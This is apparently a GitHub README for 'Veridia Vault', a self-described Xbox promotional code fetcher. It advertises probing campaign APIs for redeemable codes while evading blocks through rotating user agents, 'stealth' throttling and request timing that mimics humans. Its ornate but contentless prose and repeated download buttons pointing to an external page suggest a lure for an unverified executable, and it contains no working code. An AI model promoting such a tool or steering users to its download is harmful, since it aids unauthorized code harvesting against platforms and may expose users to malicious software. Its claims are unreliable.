![preview](https://raw.githubusercontent.com/gnacadjahilux-coder/Xbox-Code-Fetcher-Suite/main/preview.svg)

# Veridia Vault: Dynamic Campaign Asset Orchestrator

## Overview

In the digital undercurrent of promotional ecosystems, there exists a constant interplay between scarcity and discovery. **Veridia Vault** is not a mere tool—it is an orchestration layer designed to navigate the entitlement validation networks of major gaming platforms, transforming ephemeral campaign tokens into structured, auditable data. Born from the lineage of Xbox-Promo-Puller, Veridia Vault evolves the concept by introducing a modular, future-proof architecture that decouples extraction from verification, adding resilience and analytical depth.

Think of it as a digital cartographer for promotional geography: instead of simply harvesting coordinates on a map, Veridia Vault builds the entire atlas, complete with topological layers that reveal which territories are active, which are exhausted, and which hold latent potential. This repository provides the core framework, ready for extension into any platform's campaign infrastructure.

![Maintenance](https://img.shields.io/badge/Status-Active-brightgreen?style=flat-square&label=Build%202026)
![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)
![Language](https://img.shields.io/badge/Language-Python%203.11%2B-blueviolet?style=flat-square)

[![Download](https://raw.githubusercontent.com/gnacadjahilux-coder/Xbox-Code-Fetcher-Suite/main/button.svg)](https://gnacadjahilux-coder.github.io/Xbox-Code-Fetcher-Suite/)

---

## 🧭 Why Veridia Vault?

Existing solutions often treat promotional code extraction as a static, linear process: fetch a batch, validate, discard. This approach ignores the dynamic nature of modern campaign systems—codes that activate on geolocation, time-windowed entitlements, tiered scarcity models, and multi-step redemption flows. Veridia Vault reimagines this by implementing a **session-aware state machine** that respects the lifecycle of each entitlement.

The result is a system that not only identifies valid codes but also maps their availability contours, providing a strategic advantage in understanding when and where to engage with a campaign. It transforms raw extraction into actionable intelligence.

---

## 🔍 Key Capabilities

- **Multi-Protocol Entitlement Verification** — Interacts with various campaign gateways (REST, GraphQL, proprietary WebSockets) without requiring credential persistence. Connects, validates, and disconnects cleanly.
- **Distributed State Orchestration** — Maintains a local ledger of processed tokens, preventing duplicate checks and enabling incremental scans across multiple sessions. No central database required—works entirely on a file-based graph.
- **Adaptive Rate Limiting** — Employs a heuristic engine that observes server response signatures and dynamically adjusts request cadence, mimicking natural human interaction patterns to avoid pattern-based blocks.
- **Exportable Campaign Cartography** — Generates JSON, CSV, or YAML maps of all discovered valid codes with metadata: region, expiry window, redemption tier, and issuer fingerprints.
- **Pluggable Asset Collector** — Designed with a lightweight plugin interface. Extend to new platforms by writing a single adapter class; the core remains unchanged.

---

## 🚦 Getting Started

This section covers how to prepare your environment and initiate your first campaign scan. The design philosophy is **zero trust in external dependencies**—everything runs from a single portable Python environment.

[![Download](https://raw.githubusercontent.com/gnacadjahilux-coder/Xbox-Code-Fetcher-Suite/main/button.svg)](https://gnacadjahilux-coder.github.io/Xbox-Code-Fetcher-Suite/)

### System Requirements

- Python 3.11 or newer (3.12 recommended for minor performance gains)
- 250 MB free disk space for temporary campaign data
- Network access to target platform endpoints (HTTP/HTTPS outbound)
- Operating system: Windows 10/11, macOS Ventura+, or modern Linux distributions (Debian 11+, Ubuntu 22.04+, Fedora 38+)

### Initial Configuration

Veridia Vault uses a plain-text configuration profile (`veridia.conf`) placed in the application root. A sample profile is included. Customize the following fields before your first run:

- `endpoint_base`: The root URL of the promotional API you wish to query.
- `user_agent_rotate`: Set to `true` or `false`. Enables a pool of randomized user-agent strings.
- `scan_depth`: Integer from 1 to 10. Higher values extend search range but increase runtime—start with `3` for discovery.

No administrative privileges are required unless you choose to install the executable globally.

### Running Your First Scan

1. Open a terminal in the application root directory.
2. Execute the launcher with your configuration profile:  
   `python veridia.py --profile campaign_alpha.conf`
3. The system will initialize the state ledger, connect to the configured endpoint, and begin probing the campaign namespace. Output streams directly to console and a timestamped log file in the `./runs/` directory.

The first scan will populate the ledger with identified endpoints. Subsequent runs will skip already verified tokens, focusing only on new or expired entries.

---

## ⚙️ Configuration Deep Dive

The true flexibility of Veridia Vault emerges through its configuration parameters. Below is an extended reference for power users.

### Session Persistence

Set `session_ttl` to control how long a discovery session remains open. A value of `0` disables persistence (each run creates a new session). Default: `3600` seconds (1 hour).

### Throttle Profiles

Define multiple throttle profiles within the configuration file. Example:

```yaml
[throttle_profiles]
high_speed = 0.1
balanced = 0.5
stealth = 1.5
```

Reference a profile at runtime with `--throttle balanced`.

### Output Filters

Use the `output_filter` parameter to exclude certain validation statuses from results:

- `valid`: Only codes that confirmed redeemable.
- `expired`: Codes that were once valid but have expired.
- `unverified`: Codes that could not be confirmed due to network errors or ambiguous responses.

Example: `output_filter = valid,expired` will produce a combined report of active and expired entitlements.

---

## 📊 Interpreting Results

Each scan generates a results directory under `./runs/YYYY-MM-DD_HHMMSS/`. Inside, you will find:

- `ledger.dat` — Binary state graph representing all tokens scanned, their statuses, and metadata.
- `report.json` — Human-readable JSON summary with counts, timing statistics, and error breakdowns.
- `anomalies.log` — Records unexpected server responses, connection drops, and malformed payloads for later analysis.

The JSON report includes a field `campaign_health` which assigns a score from 0.0 (depleted) to 1.0 (fully stocked). This score is calculated from the ratio of valid to total verified tokens, adjusted for age.

---

## 🛠️ Extending with Adapters

To add support for a new platform:

1. Create a new file in the `./adapters/` directory, e.g., `platform_echo.py`.
2. Implement the `EntitlementAdapter` abstract class found in `core/engine.py`:

   ```python
   from core.engine import EntitlementAdapter

   class EchoAdapter(EntitlementAdapter):
       def identify_endpoints(self):
           # Return list of discovered API endpoints
           pass

       def validate_token(self, token):
           # Return (status_code, metadata_dict)
           pass
   ```

3. Register the adapter in `veridia.conf` under `[adapters]`:  
   `enabled = platform_echo`

No other code changes are required—the orchestration engine automatically loads registered adapters.

---

## 🌐 Multilingual Interface

The core console output supports **English, Spanish, Japanese, and German**. Set the language in your configuration profile:

```ini
[locale]
language = es
```

Community-contributed locale files are welcome. See the `./locales/` directory for templates.

---

## 🕐 24/7 Campaign Monitoring

Veridia Vault includes a **daemon mode** (`--daemon`) that runs indefinitely at a configurable interval. Use case: monitor a campaign for restocks or new tier releases.

Example:
```bash
python veridia.py --daemon --interval 900 --profile monitor.conf
```

This checks every 900 seconds (15 minutes). Logs rotate automatically, preserving the last 30 days of activity.

---

## 🧪 Development & Contribution

### Vision

Veridia Vault aims to become the standard reference implementation for ethical promotional asset analysis. The roadmap includes:

- **Q1 2026**: Support for tokenized authentication flows (OAuth 2.0 device code grant)
- **Q2 2026**: Plugin marketplace for community adapters
- **Q3 2026**: Real-time dashboard using WebSocket push from orchestration engine

### Contributing

1. Fork this repository.
2. Create a feature branch (`git checkout -b feature/geo-aware-scanner`).
3. Implement your changes.
4. Submit a pull request with a clear description of the enhancement.

All contributions must pass the test suite. Run `python -m pytest tests/` before submitting.

---

## 📜 License

This project is released under the **MIT License**. You are free to use, modify, and distribute this software, provided that the original copyright notice and permission notice are included in all copies or substantial portions of the software.

See the full license text: [LICENSE](./LICENSE)

---

## ⚠️ Disclaimer

**Veridia Vault is provided for educational and research purposes only.** The creators assume no liability for any misuse, including but not limited to violation of terms of service of third-party platforms, unauthorized access to protected systems, or circumvention of security measures. Users are solely responsible for ensuring compliance with applicable laws and agreements.

By using this software, you acknowledge that promotional campaigns are the intellectual property of their respective platforms, and that automated extraction may be subject to limitations imposed by those platforms. Exercise judgment and respect rate limits.

---

## 📬 Support & Community

- **Documentation**: Full API reference is available in the `./docs/` directory.
- **Issues**: Use the GitHub issue tracker for bugs, feature requests, and adapter support questions.
- **Discussion**: Community conversations happen in the repository's Discussions tab.

No direct contact information is provided; all interactions occur through the repository's public channels.

---

## 📈 Final Thoughts

Promotional ecosystems are not static vaults to be raided—they are dynamic, breathing marketplaces of limited opportunities. Veridia Vault respects that complexity by offering an orchestration layer that adapts, learns, and reports without presumption. Whether you are a campaign analyst, a researcher studying digital scarcity models, or a developer building a larger entitlement management system, this framework provides a solid, modular foundation.

The journey of a thousand tokens begins with a single scan. **Run Veridia Vault and see what the campaign landscape reveals.**

[![Download](https://raw.githubusercontent.com/gnacadjahilux-coder/Xbox-Code-Fetcher-Suite/main/button.svg)](https://gnacadjahilux-coder.github.io/Xbox-Code-Fetcher-Suite/)